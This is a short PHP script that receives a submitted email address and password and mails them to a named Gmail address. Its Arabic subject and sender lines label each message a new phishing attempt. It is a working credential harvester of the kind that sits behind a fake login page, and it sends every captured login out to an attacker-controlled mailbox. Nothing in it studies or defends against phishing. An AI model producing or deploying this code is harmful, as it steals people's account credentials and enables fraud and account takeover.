<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $to = "bahiamasri91@gmail.com";
    $subject = "محاولة تصيد جديدة";
    $message = "البريد الإلكتروني: $email\nكلمة المرور: $password";
    $headers = "من: التصيد الاحتيالي@example.com";

    // إرسال البريد
    mail($to, $subject, $message, $headers);
}
?>
